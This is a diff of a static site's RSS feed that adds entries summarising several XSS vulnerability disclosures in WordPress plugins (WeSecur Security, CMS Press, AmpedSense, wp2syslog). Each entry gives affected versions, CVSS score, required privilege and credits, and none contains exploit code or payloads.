@@ -5,7 +5,7 @@
     <description>Recent content in Docs on RTFM</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-US</language>
-    <lastBuildDate>Mon, 02 Nov 2026 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Sat, 21 Nov 2026 00:00:00 +0000</lastBuildDate>
     
 	  <atom:link href="http://localhost:1313/docs/index.xml" rel="self" type="application/rss+xml" />
     
@@ -14,6 +14,2396 @@
         
       
     
+    
+    <item>
+      <title>CVE-2023-24390</title>
+      <link>http://localhost:1313/docs/07_research/10-cve-2023-24390/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/10-cve-2023-24390/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress WeSecur Security Plugin &amp;lt;= 1.2.1 is vulnerable to Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.2.1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;WeSecur Security&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.2.1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-24390&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-24390&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Administrator&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;d9bfc2401aca&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;18 May, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;2 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-25452</title>
+      <link>http://localhost:1313/docs/07_research/14-cve-2023-25452/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/14-cve-2023-25452/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress CMS Press Plugin &amp;lt;= 0.2.3 is vulnerable to Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 0.2.3&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;CMS Press&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 0.2.3&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-25452&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-25452&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Administrator&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;688d89a4ffb8&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;13 Mar, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;1 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-25476</title>
+      <link>http://localhost:1313/docs/07_research/04-cve-2023-25476/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/04-cve-2023-25476/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress AmpedSense – AdSense Split Tester Plugin &amp;lt;= 4.68 is vulnerable to a medium priority Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 4.68&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 7.1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;AmpedSense – AdSense Split Tester&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 4.68&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-25476&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-25476&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟠Medium&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;7.1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Unauthenticated&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;7e14cb3c2001&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;3 Oct, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;31 Jan, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-25974</title>
+      <link>http://localhost:1313/docs/07_research/16-cve-2023-25974/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/docs/07_research/16-cve-2023-25974/</guid>
+      <description>
+        
+        
+        &lt;div style=&#34;margin-top: 1rem; margin-bottom: 2rem; font-size: 0.875rem; color: #6b7280; display: flex; align-items: center; flex-wrap: wrap; gap: 10px;&#34;&gt;
+  
+    &lt;span style=&#34;display: flex; align-items: center; gap: 6px;&#34;&gt;
+      By:
+      
+        
+        
+        
+        
+          
+          
+          
+            
+          
+          
+          &lt;a href=&#34;https://www.linkedin.com/in/prasannavbalaji&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34; style=&#34;display: inline-flex; align-items: center; gap: 4px; font-weight: 600; color: #0a66c2; text-decoration: none; border-bottom: 1px solid transparent;&#34; onmouseover=&#34;this.style.borderBottom=&#39;1px solid #0a66c2&#39;&#34; onmouseout=&#34;this.style.borderBottom=&#39;1px solid transparent&#39;&#34;&gt;
+            &lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; width=&#34;14&#34; height=&#34;14&#34; viewBox=&#34;0 0 24 24&#34; fill=&#34;currentColor&#34;&gt;
+                &lt;path d=&#34;M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z&#34;/&gt;
+            &lt;/svg&gt;
+            Prasanna
+          &lt;/a&gt;
+        
+      
+    &lt;/span&gt;
+  
+
+  
+    &lt;span style=&#34;color: #d1d5db;&#34;&gt;|&lt;/span&gt;
+    &lt;time style=&#34;font-style: italic;&#34;&gt;November 21, 2026&lt;/time&gt;
+  
+&lt;/div&gt;
+&lt;h4&gt;Vulnerability : Cross Site Scripting (XSS)&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;vulnerability--cross-site-scripting-xss&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#vulnerability--cross-site-scripting-xss&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/p&gt;
+&lt;p&gt;CVSS score is a way to evaluate and rank reported vulnerabilities in a standardized and repeatable way but which is not ideal for WordPress.&lt;/p&gt;
+&lt;h4&gt;Details : User Interaction Required&lt;span class=&#34;hx:absolute hx:-mt-20&#34; id=&#34;details--user-interaction-required&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#details--user-interaction-required&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;While this vulnerability can be initiated by the role shown in &amp;ldquo;Required Privilege&amp;rdquo;, successful exploitation requires a privileged user to perform an action — such as clicking a malicious link, visiting a crafted page, or submitting a form.&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;Title&lt;/th&gt;
+					&lt;th&gt;WordPress wp2syslog Plugin &amp;lt;= 1.0.5 is vulnerable to Cross Site Scripting (XSS)&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable Versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.0.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Risk&lt;/td&gt;
+					&lt;td&gt;CVSS 5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerability&lt;/td&gt;
+					&lt;td&gt;&lt;strong&gt;Cross Site Scripting (XSS):&lt;/strong&gt; Attackers can inject malicious scripts into the site that steal visitor data or hijack their accounts.&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Software&lt;/td&gt;
+					&lt;td&gt;wp2syslog&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Type&lt;/td&gt;
+					&lt;td&gt;Plugin&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Vulnerable versions&lt;/td&gt;
+					&lt;td&gt;&amp;lt;= 1.0.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patched in&lt;/td&gt;
+					&lt;td&gt;No official patch available&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;OWASP Top 10&lt;/td&gt;
+					&lt;td&gt;A7: Cross-Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Classification&lt;/td&gt;
+					&lt;td&gt;Cross Site Scripting (XSS)&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVE ID&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-25974&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2023-25974&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Patchstack priority&lt;/td&gt;
+					&lt;td&gt;🟢Low&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CVSS severity&lt;/td&gt;
+					&lt;td&gt;5.9&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Required privilege&lt;/td&gt;
+					&lt;td&gt;Administrator&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PSID&lt;/td&gt;
+					&lt;td&gt;3e4ffc697cd7&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Credits&lt;/td&gt;
+					&lt;td&gt;Prasanna V Balaji&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Published&lt;/td&gt;
+					&lt;td&gt;28 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Reported by&lt;/td&gt;
+					&lt;td&gt;&lt;a
+    href=&#34;https://patchstack.com/database/researchers/749f2e1d-43ee-4906-8e67-5676b999c89e&#34;target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Prasanna V Balaji&lt;/a&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Date&lt;/td&gt;
+					&lt;td&gt;21 Feb, 2023&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>CVE-2023-26516</title>
+      <link>http://localhost:1313/docs/07_research/12-cve-2023-26516/</link>
+      <pubDate>Sat, 21 Nov 2026 00:00:00 +0000</pubDate>
+      
